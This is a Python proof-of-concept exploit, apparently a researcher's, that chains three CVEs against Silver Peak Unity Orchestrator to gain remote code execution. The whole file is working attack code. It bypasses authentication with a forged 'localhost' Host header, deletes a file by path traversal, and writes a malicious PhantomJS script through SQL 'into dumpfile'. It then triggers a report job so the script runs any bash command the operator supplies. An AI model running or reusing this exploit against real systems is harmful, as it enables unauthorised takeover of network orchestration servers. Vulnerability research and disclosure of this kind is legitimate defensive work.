"""
    Silver Peak Unity Orchestrator RCE
    By Ariel Tempelhof of Realmode Labs
    Using the following CVEs:
        CVE-2020–12145
        CVE-2020–12146
        CVE-2020–12147
"""


import requests
import json
import argparse

requests.packages.urllib3.disable_warnings()


class SPOrchestratorClient:
    def __init__(self, host):
        self.host = host
        self.session = requests.Session()
        self.session.verify = False

    def _send_request_with_auth_bypass(self, uri, **kwargs):
        if not uri.startswith("/"):
            uri = f"/{uri}"
        url = f"https://{self.host}{uri}"

        req = requests.Request("POST", url, **kwargs)
        prep_req: requests.PreparedRequest = self.session.prepare_request(req)
        prep_req.headers["Host"] = "localhost"
        res = self.session.send(prep_req)

        print(res.status_code)
        print(res.text)

    def delete_file(self, filename):
        filename = filename.replace("/home/gms/gms", "..")
        json_data = {"fileName": filename}

        self._send_request_with_auth_bypass("/gms/rest/debugFiles/delete", json=json_data)

    def write_file(self, filename, content):
        content = content.replace("\n", r"\n")
        json_data = {"type": "SELECT", "sql": f"select '{content}' into dumpfile '{filename}';"}

        self._send_request_with_auth_bypass("/gms/rest/sqlExecution", json=json_data)

    def generate_report(self):
        json_data = {"jobCategory": 2, "description": "Global Report", "id": 3,
                     "config": {"top": 10, "trafficType": "OPTIMIZED_TRAFFIC", "overlayValue": "all", "recipients": "",
                                "charts": ["appliancesDataTransferAndReduction"], "dscpValue": "0", "trafficClassValue": 1,
                                "granularity": {"minutely": {"on": True, "range": 240}, "hourly": {"on": True, "range": 24},
                                                "daily": {"on": True, "range": 14}},
                                "customTimeRange": {"startDate": 1596323220, "endDate": 1596928020},
                                "filter": {"tunnels": [], "applications": []}},
                     "targetAppliance": {"nePks": [], "groupPks": ["0.Network"]}, "schedule": {"runNow": True}}

        self._send_request_with_auth_bypass("/gms/rest/gms/job", json=json_data)


def prepare_js_code(cmd):
    js_code = f"""var process = require("child_process")
    var spawn = process.spawn
    var child = spawn("bash", ["-c", "{cmd}"])
    phantom.exit()"""

    return js_code


def parse_args():
    parser = argparse.ArgumentParser(description='Silver Peak Unity Orchestrator RCE Exploit')
    parser.add_argument('host', help='Orchestrator Host or IP')
    parser.add_argument('cmd', help="command to run")

    args = parser.parse_args()

    return args


def main():
    args = parse_args()

    file_to_write = "/home/gms/gms/phantomGenImg.js"
    file_content = prepare_js_code(args.cmd)

    spoc = SPOrchestratorClient(args.host)

    spoc.delete_file(file_to_write)
    spoc.write_file(file_to_write, file_content)
    spoc.generate_report()


if __name__ == "__main__":
    main()
